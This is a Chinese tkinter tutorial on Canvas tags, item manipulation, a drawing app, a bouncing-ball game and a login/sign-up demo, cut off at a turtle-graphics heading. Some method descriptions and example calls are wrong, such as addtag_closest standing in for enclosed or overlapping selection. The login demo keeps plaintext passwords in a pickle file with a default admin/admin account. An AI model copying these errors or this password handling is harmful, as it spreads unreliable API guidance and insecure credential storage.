Canvas以"堆叠"的形式来管理这些图形项,先绘制的图形项位于"堆叠"的下面,后绘制的图形项位于"堆叠"的上面。因此如果两个图形项有重叠的部分,那么后绘制的图形项(位于上面)会遮挡先绘制的图形项。

为了修改、删除这些图形项,程序需要先获得这些图形项的引用,获得这些图形项的引用有两种方式：
通过图形项的id,也就是Canvas执行create_xxx()方法的返回值。一般create_xxx()会依次返回1、2、3等整数作为图形项的id
通过图形项的tag(标签)。

在Canvas中调用create_xxx()方法绘图时还可传入一个tags选项,该选项可以为所绘制的图形项(比如矩形、椭圆、多边形等)添加一个或多个tag(标签)
Canvas还允许调用方法为图形项添加tag、删除tag等,这些tag也相当于该图形项的标识,程序完全可以根据tag来获取图形项。

Canvas提供了如下方法来为图形项添加tag：
addtag_aboove(self, newtag, tagOrId)：为tagOrId对应图形项的上一个图形项添加新tag
addtag_all(self, newtag)：为所有图形项添加新tag
addtag_below(self, newtag, tagOrId)：为tagOrId对应图形项的下一个图形项添加新tag
addtag_closest(self, newtag, x, y)：为和x、y点最接近的图形项添加新tag
addtag_enclosed(self, newtag, x1, y1, x2, y2)：为指定矩形区域内最上面的图形项添加新tag,x1、y1确定矩形区域的左上角坐标;x2、y2确定矩形区域的右下角坐标
addtag_overlapping(self, newtag, x1, y1, x2, y2)：为与指定矩形区域重叠的最上面的图形项添加tag
addtag_withtag(self, newtag, tagOrId)：为tagOrId对应图形项添加新tag

Canvas提供了如下方法来删除图形项的tag：
dtag(self, *args)：删除指定图形项的tag。

Canvas提供了如下方法来获取图形项的所有tag：
gettags(self, *args)：获取指定图形项的所有tag。

Canvas提供了如下方法根据tag来获取其对应的所有图形项：
find_withtag(self, tagOrId)：获取tagOrId对应的所有图形项。

</pre><textarea>
from tkinter import *
root = Tk()
root.title('操作标签')
cv = Canvas(root, background='white', width=620, height=250)
cv.pack(fill=BOTH, expand=YES)

rt = cv.create_rectangle(40, 40, 300, 220,outline='blue', width=2,tag = ('t1', 't2', 't3', 'tag4')) # 绘制一个矩形框,为该图形项指定标签
print(rt)     # 1,访问图形项的id,也就是编号
oval = cv.create_oval(350, 50, 580, 200,fill='yellow', width=0,tag = ('g1', 'g2', 'g3', 'tag4'))    # 为该图形项指定标签
print(oval)   # 2,访问图形项的id,也就是编号

print(cv.find_withtag('tag4')) # (1, 2),根据指定tag该tag对应的所有图形项
print(cv.gettags(rt))  # ('t1', 't2', 't3', 'tag4'),获取指定图形项的所有tag
print(cv.gettags(2))   # ('g1', 'g2', 'g3', 'tag4')
cv.dtag(1, 't1')       # 删除id为1的图形项上名为t1的tag
cv.dtag(oval, 'g1')    # 删除id为oval的图形项上名为g1的tag
print(cv.gettags(rt))  # ('tag4', 't2', 't3')
print(cv.gettags(2))   # ('tag4', 'g2', 'g3')

cv.addtag_all('t5')      # 为所有图形项添加tag
print(cv.gettags(1))     # ('tag4', 't2', 't3', 't5')
print(cv.gettags(oval))  # ('tag4', 'g2', 'g3', 't5')

cv.addtag_withtag('t6', 'g2') # 为指定图形项添加tag
print(cv.gettags(1))     # ('tag4', 't2', 't3', 't5')
print(cv.gettags(oval))  # ('tag4', 'g2', 'g3', 't5', 't6')

cv.addtag_above('t7', 't2') # 为指定图形项上面的图形项添加tag, t2上面的就是oval图形项
print(cv.gettags(1))        # ('tag4', 't2', 't3', 't5')
print(cv.gettags(oval))     # ('tag4', 'g2', 'g3', 't5', 't6', 't7')

cv.addtag_below('t8', 'g2') # 为指定图形项下面的图形项添加tag, g2下面的就是rt图形项
print(cv.gettags(1))        # ('tag4', 't2', 't3', 't5', 't8')
print(cv.gettags(oval))     # ('tag4', 'g2', 'g3', 't5', 't6', 't7')

cv.addtag_closest('t9', 360, 90) # 为最接近指定点的图形项添加tag,最接近360、90的图形项是oval
print(cv.gettags(1))             # ('tag4', 't2', 't3', 't5', 't8')
print(cv.gettags(oval))          # ('tag4', 'g2', 'g3', 't5', 't6', 't7', 't9')

cv.addtag_closest('t10', 30, 30, 600, 240)  # 为位于指定区域内(几乎覆盖整个图形区)的最上面的图形项添加tag
print(cv.gettags(1))                        # ('tag4', 't2', 't3', 't5', 't8')
print(cv.gettags(oval))                     # ('tag4', 'g2', 'g3', 't5', 't6', 't7', 't9', 't10')

cv.addtag_closest('t11', 250, 30, 400, 240) # 为与指定区域内重合的最上面的图形项添加tag
print(cv.gettags(1))                        # ('tag4', 't2', 't3', 't5', 't8')
print(cv.gettags(oval))                     # ('tag4', 'g2', 'g3', 't5', 't6', 't7', 't9', 't10', 't11')
root.mainloop()

</textarea><pre>
操作图形项
在Canvas中获取图形项之后,接下来可通过Canvas提供的大量方法来操作图形项

Canvas提供了如下方法在图形项"堆叠"中查找图形项：
find_above(self, tagOrId)：返回tagOrId对应图形项的上一个图形项。
find_all(self)：返回全部图形项。
find_below(self, tagOrId)：返回tagOrId对应图形项的下一个图形项。
find_closest(self, x, y)：返回和 x 、y 点最接近的图形项。
find_enclosed(self, x1, y1, x2, y2)：返回位于指定矩形区域内最上面的图形项。
find_overlapping(self, x1, y1, x2, y2)：返回与指定矩形区域重叠的最上面的图形项。
find_withtag(self, tagOrId)：返回tagOrId对应的全部图形项。

Canvas提供了如下方法在图形项"堆叠"中移动图形项：
tag_lower(self, *args)|lower：将args的第一个参数对应的图形项移到"堆叠"的最下面。也可额外指定一个参数代表移动到指定图形项的下面。
tag_raise(self, *args)|lift：将args的第一个参数对应的图形项移到"堆叠"的最上面。也可额外指定一个参数代表移动到指定图形项的上面。

如果程序希望获取或修改图形项的选项则可通过Canvas的如下方法来操作：
itemcget(self, tagOrId, option)：获取tagOrId对应图形项的option选项值。
itemconfig(self, tagOrId, cnf=None, **kw)：为tagOrId对应图形项配置选项。
itemconfigure：该方法与上一个方法完全相同。

Canvas提供了如下方法来改变图形项的大小和位置：
coords(self, *args)：重设图形项的大小和位置。
move(self, *args)：移动图形项,但不能改变大小,就是在图形项的x、y基础上加上新的mx、my参数。
scale(self, *args)：缩放图形项。该方法的args参数要传入4个值,其中前两个值指定缩放中心;后两个值指定x、y方向的缩放比。

Canvas提供了如下方法来删除图形项或文字图形项(由create_text方法创建)中间的部分文字：
delete(self, *args)：删除指定id或tag对应的全部图形项。
dchars(self, *args)：删除文字图形项中间的部分文字。

</pre><textarea>
from tkinter import *
from tkinter import colorchooser
import threading
root = Tk()
root.title('操作图形项')
cv = Canvas(root, background='white', width=400, height=350)
cv.pack(fill=BOTH, expand=YES)

current = None         # 该变量用于保存当前选中的图形项
current_outline = None # 该变量用于保存当前选中的图形项的边框颜色
current_width = None   # 该变量用于保存当前选中的图形项的边框宽度

# 该函数用于高亮显示选中图形项(边框颜色会red、yellow之间切换)
def show_current():
    # 如果当前选中图形项的边框色为red,将它改为yellow,否则将颜色改为red
    if current is not None:
        if cv.itemcget(current, 'outline') == 'red':
            cv.itemconfig(current, width=2, outline='yellow')
        else:
             cv.itemconfig(current, width=2,outline='red')
    global t
    t = threading.Timer(0.2, show_current) # 通过定时器指定0.2秒之后执行show_current函数
    t.start()

# 通过定时器指定0.2秒之后执行show_current函数
t = threading.Timer(0.2, show_current)
t.start()

rect = cv.create_rectangle(30, 30, 250, 200,fill='magenta', width='0')
oval = cv.create_oval(180, 50, 380, 180,fill='yellow', width='0')
circle = cv.create_oval(120, 150, 300, 330,fill='pink', width='0')

bottomF = Frame(root)
bottomF.pack(fill=X,expand=True)
liftbn = Button(bottomF, text='向上',command=lambda : cv.tag_raise(oval, cv.find_above(oval))) # 将椭圆移动到它上面的item之上
liftbn.pack(side=LEFT, ipadx=10, ipady=5, padx=3)
lowerbn = Button(bottomF, text='向下',command=lambda : cv.tag_lower(oval, cv.find_below(oval))) # 将椭圆移动到它下面的item之下
lowerbn.pack(side=LEFT, ipadx=10, ipady=5, padx=3)

def change_fill():
    fill_color = colorchooser.askcolor(parent=root, title='选择填充颜色', color =  cv.itemcget(oval, 'fill'))
    if fill_color is not None: cv.itemconfig(oval, fill=fill_color[1])
fillbn = Button(bottomF, text='改变椭圆的填充色',command=change_fill)
fillbn.pack(side=LEFT, ipadx=10, ipady=5, padx=3)

def change_outline():
    outline_color = colorchooser.askcolor(parent=root, title='选择边框颜色', color = cv.itemcget(oval, 'outline'))
    if outline_color is not None:
        cv.itemconfig(oval, outline=outline_color[1], width=4)
outlinebn = Button(bottomF, text='改变椭圆的边框色', command=change_outline)
outlinebn.pack(side=LEFT, ipadx=10, ipady=5, padx=3)

movebn = Button(bottomF, text='椭圆右下移动', command=lambda : cv.move(oval, 15, 10))
movebn.pack(side=LEFT, ipadx=10, ipady=5, padx=3)
coordsbn = Button(bottomF, text='椭圆位置复位', command=lambda : cv.coords(oval, 180, 50, 380, 180))
coordsbn.pack(side=LEFT, ipadx=10, ipady=5, padx=3)

# 再次添加Frame容器
bottomF = Frame(root)
bottomF.pack(fill=X,expand=True)
Button(bottomF, text='椭圆缩小',command=lambda : cv.scale(oval, 180, 50, 0.8, 0.8)).pack(side=LEFT, ipadx=10, ipady=5, padx=3)
Button(bottomF, text='椭圆放大', command=lambda : cv.scale(oval, 180, 50, 1.2, 1.2)).pack(side=LEFT, ipadx=10, ipady=5, padx=3)

def select_handler(ct):
    global current, current_outline, current_width
    if ct is not None and len(ct) > 0: # 如果ct元组包含了选中项
        ct = ct[0]
        if current is not None:  # 如果current对应的图形项不为空
            cv.itemconfig(current, outline=current_outline,width = current_width) # 恢复current对应的图形项的边框
        current_outline = cv.itemcget(ct, 'outline') # 获取当前选中图形项的边框信息
        current_width = cv.itemcget(ct, 'width')
        current = ct  # 使用current保存当前选中项

def click_handler(event):
    ct = cv.find_closest(event.x, event.y)  # 获取当前选中的图形项
    select_handler(ct)                      # 调用select_handler处理选中图形项

def click_select():
    # 取消为"框选"绑定的两个事件处理函数
    cv.unbind('<B1-Motion>')
    cv.unbind('<ButtonRelease-1>')
    # 为"点选"绑定鼠标点击的事件处理函数
    cv.bind('<Button-1>', click_handler)

Button(bottomF, text='点选图形项', command=click_select).pack(side=LEFT, ipadx=10, ipady=5, padx=3)

firstx = firsty = None # 记录鼠标拖动的第一个点的x、y坐标
prev_select = None     # 记录前一次绘制的、代表选择区的虚线框

def drag_handler(event):
    global firstx, firsty, prev_select
    # 刚开始拖动时,用鼠标位置为firstx、firsty赋值
    if firstx is None and firsty is None: firstx, firsty = event.x, event.y
    leftx, lefty = min(firstx, event.x), min(firsty, event.y)
    rightx, righty = max(firstx, event.x), max(firsty, event.y)
    # 删除上一次绘制的虚线选择框
    if prev_select is not None: cv.delete(prev_select)
    # 重新绘制虚线选择框
    prev_select = cv.create_rectangle(leftx, lefty, rightx, righty, dash=2)

def release_handler(event):
    global firstx, firsty
    if prev_select is not None: cv.delete(prev_select)
    if firstx is not None and firsty is not None:
        leftx, lefty = min(firstx, event.x), min(firsty, event.y)
        rightx, righty = max(firstx, event.x), max(firsty, event.y)
        firstx = firsty = None
        ct = cv.find_enclosed(leftx, lefty, rightx, righty)  # 获取当前选中的图形项
        select_handler(ct)                                   # 调用select _handler处理选中图形项

def rect_select():
    # 取消为"点选"绑定的事件处理函数
    cv.unbind('<Button-1>')
    # 为"框选"绑定鼠标拖动、鼠标释放的事件处理函数
    cv.bind('<B1-Motion>', drag_handler)
    cv.bind('<ButtonRelease-1>', release_handler)

Button(bottomF, text='框选图形项',command=rect_select).pack(side=LEFT, ipadx=10, ipady=5, padx=3)

Button(bottomF, text='删除椭圆',command=lambda : cv.delete(oval)).pack(side=LEFT, ipadx=10, ipady=5, padx=3)
root.mainloop()

</textarea><pre>
Canvas tag_bind：指定图形项绑定事件处理函数或方法
Canvas提供了一个tag_bind()方法用于为指定图形项绑定事件处理函数或方法,这样图形项就可以响应用户动作了。

</pre><textarea>
from tkinter import *
root = Tk()
cv = Canvas(root,bg = 'white')
cv.pack()
cv.create_rectangle(30, 30, 220, 150,width = 8,tags = ('r1','r2','r3'))
def first(event):
    print('第一次的函数')
def second(event):
    print('第二次的函数')
# 为指定图形项的左键单击事件绑定处理函数
cv.tag_bind('r1','<Button-1>', first)
# 为指定图形项的左键单击事件绑定处理函数
cv.tag_bind('r1','<Button-1>', second, add=True) # add为True是添加,否则是替代
root.mainloop()

</textarea>开发一个功能相对完善的绘图程序,该程序可以让用户绘制直线、矩形、椭圆、多边形,用户还可以通过鼠标左键单击来选中所绘制的图形,也可以通过鼠标右键拖动来移动图形项,该程序并不是简单地绘制图形,而是当用户拖动鼠标时可以动态地绘制虚线图形,只有当用户松开鼠标时才真正完成绘制<textarea>
from tkinter import *
from tkinter import ttk
from tkinter import colorchooser
import threading
class App:
    def __init__(self, master):
        self.master = master
        self.width = IntVar()                # 保存设置初始的边框宽度
        self.width.set(1)
        self.outline = 'black'               # 保存设置初始的边框颜色
        self.fill = None                     # 保存设置初始的填充颜色
        self.prevx = self.prevy = -10        # 记录拖动时前一个点的x、y坐标
        self.firstx = self.firsty = -10      # 记录拖动开始的第一个点的x、y坐标
        self.mv_prevx = self.mv_prevy = -10  # 记录拖动右键来移动图形时前一个点的x、y坐标
        self.item_type = 0                   # item_type记录要绘制哪种图形
        self.points = []
        self.init_widgets()
        self.temp_item = None
        self.temp_items = []
        self.choose_item = None              # 初始化选中的图形项
    # 创建界面组件
    def init_widgets(self):
        self.cv = Canvas(root, background='white')
        self.cv.pack(fill=BOTH, expand=True)
        # 为鼠标左键拖动事件、鼠标左键释放事件、鼠标左键双击事件绑定处理函数
        self.cv.bind('<B1-Motion>', self.drag_handler)
        self.cv.bind('<ButtonRelease-1>', self.release_handler)
        self.cv.bind('<Double-1>', self.double_handler)

        f = ttk.Frame(self.master)
        f.pack(fill=X)
        self.bns = []
        # 采用循环创建多个按钮,用于绘制不同的图形
        for i, lb in enumerate(('直线', '矩形', '椭圆', '多边形', '铅笔')):
            bn = Button(f, text=lb, command=lambda i=i: self.choose_type(i))
            bn.pack(side=LEFT, ipadx=8,ipady=5, padx=5)
            self.bns.append(bn)
        self.bns[self.item_type]['relief'] = SUNKEN  # 设置默认图形的立体样式
        ttk.Button(f, text='边框颜色',command=self.choose_outline).pack(side=LEFT, ipadx=8,ipady=5, padx=5)
        ttk.Button(f, text='填充颜色',command=self.choose_fill).pack(side=LEFT, ipadx=8,ipady=5, padx=5)
        om = ttk.OptionMenu(f,
            self.width,   # 绑定变量
            '1',          # 设置初始选中值
            '0','1','2','3','4','5','6','7','8', # 以下多个值用于设置菜单项
            command = None)
        om.pack(side=LEFT, ipadx=8,ipady=5, padx=5)

    def choose_type(self, i):
        for b in self.bns: b['relief'] = RAISED  # 将所有按钮恢复默认状态
        self.bns[i]['relief'] = SUNKEN           # 将当前按钮设置选中样式
        self.item_type = i                       # 设置要绘制的图形

    # 处理选择边框颜色的方法
    def choose_outline(self):
        select_color = colorchooser.askcolor(parent=self.master,title="请选择边框颜色", color=self.outline)
        if select_color is not None:self.outline = select_color[1]

    # 处理选择填充颜色的方法
    def choose_fill(self):
        select_color = colorchooser.askcolor(parent=self.master,title="请选择填充颜色", color=self.fill)
        if select_color is not None:
            self.fill = select_color[1]
        else:
            self.fill = None

    def drag_handler(self, event):
        # 如果是绘制直线
        if self.item_type == 0:
            # 如果第一个点不存在(self.firstx 和 self.firsty都小于0)
            if self.firstx < -1 and self.firsty < -1: self.firstx, self.firsty = event.x, event.y
            # 删除上一次绘制的虚线图形
            if self.temp_item is not None: self.cv.delete(self.temp_item)
            # 重新绘制虚线
            self.temp_item = self.cv.create_line(self.firstx, self.firsty, event.x, event.y, dash=2)

        # 如果是绘制矩形或椭圆
        if self.item_type == 1 or self.item_type == 2:
            # 如果第一个点不存在(self.firstx 和 self.firsty都小于0)
            if self.firstx < -1 and self.firsty < -1: self.firstx, self.firsty = event.x, event.y
            # 删除上一次绘制的虚线图形
            if self.temp_item is not None: self.cv.delete(self.temp_item)
            leftx, lefty = min(self.firstx, event.x), min(self.firsty, event.y)
            rightx, righty = max(self.firstx, event.x), max(self.firsty, event.y)
            # 重新绘制虚线选择框
            self.temp_item = self.cv.create_rectangle(leftx, lefty, rightx, righty, dash=2)

        # 如果是绘制多边形
        if self.item_type == 3:
            self.draw_polygon = True
            # 如果第一个点不存在(self.firstx 和 self.firsty都小于0)
            if self.firstx < -1 and self.firsty < -1: self.firstx, self.firsty = event.x, event.y
            # 删除上一次绘制的虚线图形
            if self.temp_item is not None: self.cv.delete(self.temp_item)
            # 重新绘制虚线
            self.temp_item = self.cv.create_line(self.firstx, self.firsty, event.x, event.y, dash=2)

        # 如果是绘制铅笔
        if self.item_type == 4:
            # 如果前一个点存在(self.prevx 和 self.prevy都大于0)
            if self.prevx > 0 and self.prevy > 0:
                self.cv.create_line(self.prevx, self.prevy, event.x, event.y, fill=self.outline, width=self.width.get())
            self.prevx, self.prevy = event.x, event.y

    def item_bind(self, t):
        self.cv.tag_bind(t, '<B3-Motion>', self.move)           # 为鼠标右键拖动事件绑定处理函数
        self.cv.tag_bind(t, '<ButtonRelease-3>', self.move_end) # 为鼠标右键释放事件绑定处理函数

    def release_handler(self, event):
        # 删除临时绘制的虚线图形项
        if self.temp_item is not None:
            # 如果不是绘制多边形
            if self.item_type != 3:
                self.cv.delete(self.temp_item)
            # 如果绘制多边形,将之前绘制的虚线先保存下来,以便后面删除它们
            else:
                self.temp_items.append(self.temp_item)
        self.temp_item = None

        # 如果是绘制直线
        if self.item_type == 0:
            # 如果第一个点存在(self.firstx 和 self.firsty都大于0)
            if self.firstx > 0 and self.firsty > 0:
                # 绘制实际的直线
                t = self.cv.create_line(self.firstx, self.firsty,
                    event.x, event.y, fill=self.outline, width=self.width.get())
                # 为鼠标左键单击事件绑定处理函数,用于选择被单击的图形项
                self.cv.tag_bind(t, '<Button-1>',
                    lambda event=event, t=t: self.choose_item_handler(event,t))
                self.item_bind(t)

        # 如果是绘制矩形或椭圆
        if self.item_type == 1 or self.item_type == 2:
            # 如果第一个点存在(self.firstx 和 self.firsty都大于0)
            if self.firstx > 0 and self.firsty > 0:
                leftx, lefty = min(self.firstx, event.x), min(self.firsty, event.y)
                rightx, righty = max(self.firstx, event.x), max(self.firsty, event.y)
                if self.item_type == 1:
                    # 绘制实际的矩形
                    t = self.cv.create_rectangle(leftx, lefty, rightx, righty,
                        outline=self.outline, fill=self.fill, width=self.width.get())
                if self.item_type == 2:
                    # 绘制实际的椭圆
                    t = self.cv.create_oval(leftx, lefty, rightx, righty,
                        outline=self.outline, fill=self.fill, width=self.width.get())
                # 为鼠标左键单击事件绑定处理函数,用于选择被单击的图形项
                self.cv.tag_bind(t, '<Button-1>',
                    lambda event=event, t=t: self.choose_item_handler(event,t))
                self.item_bind(t)

        if self.item_type != 3:
            self.prevx = self.prevy = -10
            self.firstx = self.firsty = -10
        # 如果正在绘制多边形
        elif(self.draw_polygon):
            # 将第一个点添加到列表中
            self.points.append((self.firstx, self.firsty))
            self.firstx, self.firsty = event.x, event.y

    def double_handler(self, event):
        # 只处理绘制多边形的情形
        if self.item_type == 3:
            t = self.cv.create_polygon(*self.points,
                outline=self.outline, fill="" if self.fill is None else self.fill,
                width=self.width.get())
            # 为鼠标左键单击事件绑定处理函数,用于选择被单击的图形项
            self.cv.tag_bind(t, '<Button-1>',
                lambda event=event, t=t: self.choose_item_handler(event,t))
            self.item_bind(t)
            # 清空所有保存的点数据
            self.points.clear()
            # 将self.firstx = self.firsty设置为-10,停止绘制
            self.firstx = self.firsty = -10
            # 删除所有临时的虚线框
            for it in self.temp_items: self.cv.delete(it)
            self.temp_items.clear()
            self.draw_polygon = False

    # 根据传入的参数t来选中对应的图形项
    def choose_item_handler(self, event, t):
        self.choose_item = t  # 使用self.choose_item保存当前选中项

    # 定义移动图形项的方法
    def move(self, event):
        # 如果被选中图形项不为空,才可以执行移动
        if self.choose_item is not None:
            # 如果前一个点存在(self.mv_prevx 和 self.mv_prevy都大于0)
            if self.mv_prevx > 0 and self.mv_prevy > 0:
                # 移动选中的图形项
                self.cv.move(self.choose_item, event.x - self.mv_prevx,
                    event.y - self.mv_prevy)
            self.mv_prevx, self.mv_prevy = event.x, event.y

    # 结束移动的方法
    def move_end(self, event):
        self.mv_prevx = self.mv_prevy = -10

    def delete_item(self, event):
        # 如果被选中的item不为空,删除被选中的图形项
        if self.choose_item is not None:
            self.cv.delete(self.choose_item)

root = Tk()
root.title("绘图工具")
root.geometry('800x680')
app = App(root)
root.bind('<Delete>', app.delete_item)  # delete键删除选中的图形项
root.mainloop()

</textarea><pre>
Canvas绘制动画
动画效果原理:程序只要增加一个定时器,周期性地改变界面上图形项的颜色、大小、位置等选项,用户看上去就是所谓的动画

下面以一个简单的桌面弹球游戏来介绍使用Canvas绘制动画
在游戏界面上会有一个小球,该小球会在界面上滚动,遇到边界或用户挡板就会反弹。该程序涉及两个动画：
小球转动：小球转动是一个"逐帧动画",程序会循环显示多张转动的小球图片,这样用户就会看到小球转动的效果。
小球移动：只要改变小球的坐标程序就可以控制小球移动。
为了让用户控制挡板移动,程序还为Canvas的向左箭头、向右箭头绑定了事件处理函数

使用Python开发游戏不要局限于使用简单的Tkinter和Canvas画布,Python的优势是拥有大量的工具和库,使用Python开发游戏则尽量考虑使用专业的游戏工具库如Pygame

</pre><textarea>
from tkinter import *
from tkinter import messagebox
import threading
import random
GAME_WIDTH = 500
GAME_HEIGHT = 680
BOARD_X = 230
BOARD_Y = 600
BOARD_WIDTH = 80
BALL_RADIUS = 9
class App:
    def __init__(self, master):
        self.master = master
        self.ball_index = 0   # 记录小球动画的第几帧
        self.is_lose = False  # 记录游戏是否失败的旗标
        self.curx = 260       # 初始化记录小球位置的变量
        self.cury = 30
        self.boardx = BOARD_X
        self.init_widgets()
        self.vx = random.randint(3, 6) # x方向的速度
        self.vy = random.randint(5, 10) # y方向的速度
        # 通过线程启动了一个定时器,该定时器控制moveball()方法每隔0.1秒执行一次,而moveball()方法中通过改变小球的坐标可以实现小球移动的效果;通过改变小球的图片,可以实现小球滚动的效果
        self.t = threading.Timer(0.1, self.moveball)
        self.t.start()
    # 创建界面组件
    def init_widgets(self):
        self.cv = Canvas(root, background='white',
            width=GAME_WIDTH, height=GAME_HEIGHT)
        self.cv.pack()
        self.cv.focus_set()  # 让画布得到焦点,从而可以响应按键事件
        self.cv.bms = []
        # 初始化小球的动画帧
        for i in range(8):
            self.cv.bms.append(PhotoImage(file='images/ball_' + str(i+1) + '.gif'))
        # 绘制小球
        self.ball = self.cv.create_image(self.curx, self.cury,
            image=self.cv.bms[self.ball_index])
        self.board = self.cv.create_rectangle(BOARD_X, BOARD_Y,
            BOARD_X + BOARD_WIDTH, BOARD_Y + 20, width=0, fill='lightblue')
        self.cv.bind('<Left>', self.move_left)   # 为向左箭头按键绑定事件,挡板左移
        self.cv.bind('<Right>', self.move_right) # 为向右箭头按键绑定事件,挡板右移
    def move_left(self, event):
        if self.boardx <= 0:
            return
        self.boardx -= 5
        self.cv.coords(self.board, self.boardx, BOARD_Y,
            self.boardx + BOARD_WIDTH, BOARD_Y + 20)
    def move_right(self, event):
        if self.boardx + BOARD_WIDTH >= GAME_WIDTH:
            return
        self.boardx += 5
        self.cv.coords(self.board, self.boardx, BOARD_Y,
            self.boardx + BOARD_WIDTH, BOARD_Y + 20)
    def moveball(self):
        self.curx += self.vx
        self.cury += self.vy
        # 小球到了右边墙壁,转向
        if self.curx + BALL_RADIUS >= GAME_WIDTH: self.vx = -self.vx
        # 小球到了左边墙壁,转向
        if self.curx - BALL_RADIUS <= 0: self.vx = -self.vx
        # 小球到了上边墙壁,转向
        if self.cury - BALL_RADIUS <= 0: self.vy = -self.vy
        # 小球到了挡板处
        if self.cury + BALL_RADIUS >= BOARD_Y:
            # 如果在挡板范围内
            if self.boardx <= self.curx <= (self.boardx + BOARD_WIDTH):
                self.vy = -self.vy
            else:
                messagebox.showinfo(title='失败', message='您已经输了')
                self.is_lose = True
        self.cv.coords(self.ball, self.curx, self.cury)
        self.ball_index += 1
        self.cv.itemconfig(self.ball, image=self.cv.bms[self.ball_index % 8])
        # 如果游戏还未失败,让定时器继续执行
        if not self.is_lose:
            self.t = threading.Timer(0.1, self.moveball)  # 通过定时器指定0.1秒之后执行moveball函数
            self.t.start()
root = Tk()
root.title("弹球游戏")
root.iconbitmap('images/fklogo.ico')
root.geometry('%dx%d' % (GAME_WIDTH, GAME_HEIGHT))
root.resizable(width=False, height=False)  # 禁止改变窗口大小
App(root)
root.mainloop()

</textarea>

<h4>标准属性</h4><pre>
标准属性也就是所有控件的共同属性,如大小,字体和颜色等等。

Dimension 控件大小;
Color 控件颜色;
Font  控件字体;
Anchor  锚点;
Relief  控件样式;
Bitmap  位图;
Cursor  光标;

</pre>demo<textarea>
import tkinter as tk  # 使用Tkinter前需要先导入
import tkinter.messagebox
import pickle

# 第1步,实例化object,建立窗口window
window = tk.Tk()

# 第2步,给窗口的可视化起名字
window.title('Wellcome to Hongwei Website')

# 第3步,设定窗口的大小(长 * 宽)
window.geometry('400x300')  # 这里的乘是小x

# 第4步,加载 wellcome image
canvas = tk.Canvas(window, width=400, height=135, bg='green')
image_file = tk.PhotoImage(file='light.gif')
image = canvas.create_image(200, 0, anchor='n', image=image_file)
canvas.pack(side='top')
tk.Label(window, text='Wellcome',font=('Arial', 16)).pack()

# 第5步,用户信息
tk.Label(window, text='User name:', font=('Arial', 14)).place(x=10, y=170)
tk.Label(window, text='Password:', font=('Arial', 14)).place(x=10, y=210)

# 第6步,用户登录输入框entry
# 用户名
var_usr_name = tk.StringVar()
var_usr_name.set('example@python.com')
entry_usr_name = tk.Entry(window, textvariable=var_usr_name, font=('Arial', 14)).place(x=120,y=175)
# 用户密码
var_usr_pwd = tk.StringVar()
entry_usr_pwd = tk.Entry(window, textvariable=var_usr_pwd, font=('Arial', 14), show='*')
entry_usr_pwd.place(x=120,y=215)

# 第8步,定义用户登录功能
def usr_login():
    # 获取用户输入的usr_name和usr_pwd
    usr_name = var_usr_name.get()
    usr_pwd = var_usr_pwd.get()

    # 这里设置异常捕获,第一次访问用户信息文件时是不存在的,所以这里设置异常捕获。
    # 中间的两行就是我们的匹配,即程序将输入的信息和文件中的信息匹配。
    try:
        with open('usrs_info.pickle', 'rb') as usr_file:
            usrs_info = pickle.load(usr_file)
    except FileNotFoundError:
        # 没有读取到`usr_file`时程序会创建一个`usr_file`这个文件,并将管理员的用户和密码写入,即用户名为`admin`密码为`admin`。
        with open('usrs_info.pickle', 'wb') as usr_file:
            usrs_info = {'admin': 'admin'}
            pickle.dump(usrs_info, usr_file)
            usr_file.close()    # 必须先关闭,否则pickle.load()会出现EOFError: Ran out of input

    # 如果用户名和密码与文件中的匹配成功则会登录成功,并跳出弹窗how are you? 加上你的用户名。
    if usr_name in usrs_info:
        if usr_pwd == usrs_info[usr_name]:
            tkinter.messagebox.showinfo(title='Welcome', message='How are you? ' + usr_name)
        # 如果用户名匹配成功而密码输入错误则会弹出'Error, your password is wrong, try again.'
        else:
            tkinter.messagebox.showerror(message='Error, your password is wrong, try again.')
    else:  # 如果发现用户名不存在
        is_sign_up = tkinter.messagebox.askyesno('Welcome！ ', 'You have not sign up yet. Sign up now?')
        # 提示需不需要注册新用户
        if is_sign_up:
            usr_sign_up()

# 第9步,定义用户注册功能
def usr_sign_up():
    def sign_to_Hongwei_Website():
        # 以下三行就是获取我们注册时所输入的信息
        np = new_pwd.get()
        npf = new_pwd_confirm.get()
        nn = new_name.get()

        # 这里是打开记录数据的文件,将注册信息读出
        with open('usrs_info.pickle', 'rb') as usr_file:
            exist_usr_info = pickle.load(usr_file)
        # 如果两次密码输入不一致则提示Error
        if np != npf:
            tkinter.messagebox.showerror('Error', 'Password and confirm password must be the same!')

        # 如果用户名已经在数据文件中则提示Error
        elif nn in exist_usr_info:
            tkinter.messagebox.showerror('Error', 'The user has already signed up!')

        # 最后如果输入无以上错误则将注册输入的信息记录到文件当中,并提示注册成功,然后销毁窗口。
        else:
            exist_usr_info[nn] = np
            with open('usrs_info.pickle', 'wb') as usr_file:
                pickle.dump(exist_usr_info, usr_file)
            tkinter.messagebox.showinfo('Welcome', 'You have successfully signed up!')
            # 然后销毁窗口。
            window_sign_up.destroy()

    # 定义长在窗口上的窗口
    window_sign_up = tk.Toplevel(window)
    window_sign_up.geometry('300x200')
    window_sign_up.title('Sign up window')

    new_name = tk.StringVar()  # 将输入的注册名赋值给变量
    new_name.set('example@python.com')  # 将最初显示定为'example@python.com'
    tk.Label(window_sign_up, text='User name: ').place(x=10, y=10)  # 将`User name:`放置在坐标(10,10)。
    entry_new_name = tk.Entry(window_sign_up, textvariable=new_name)  # 创建一个注册名的`entry`,变量为`new_name`
    entry_new_name.place(x=130, y=10)  # `entry`放置在坐标(150,10).

    new_pwd = tk.StringVar()
    tk.Label(window_sign_up, text='Password: ').place(x=10, y=50)
    entry_usr_pwd = tk.Entry(window_sign_up, textvariable=new_pwd, show='*')
    entry_usr_pwd.place(x=130, y=50)

    new_pwd_confirm = tk.StringVar()
    tk.Label(window_sign_up, text='Confirm password: ').place(x=10, y=90)
    entry_usr_pwd_confirm = tk.Entry(window_sign_up, textvariable=new_pwd_confirm, show='*')
    entry_usr_pwd_confirm.place(x=130, y=90)

    # 下面的 sign_to_Hongwei_Website
    btn_comfirm_sign_up = tk.Button(window_sign_up, text='Sign up', command=sign_to_Hongwei_Website)
    btn_comfirm_sign_up.place(x=180, y=120)

# 第7步,login and sign up 按钮
btn_login = tk.Button(window, text='Login', command=usr_login)
btn_login.place(x=120, y=250)
btn_sign_up = tk.Button(window, text='Sign up', command=usr_sign_up)
btn_sign_up.place(x=200, y=250)

# 第10步,主窗口循环显示
window.mainloop()

</textarea>
</div>

<div id="turtle">
<h4>海龟绘图(Turtle Graphics)</h4><pre>
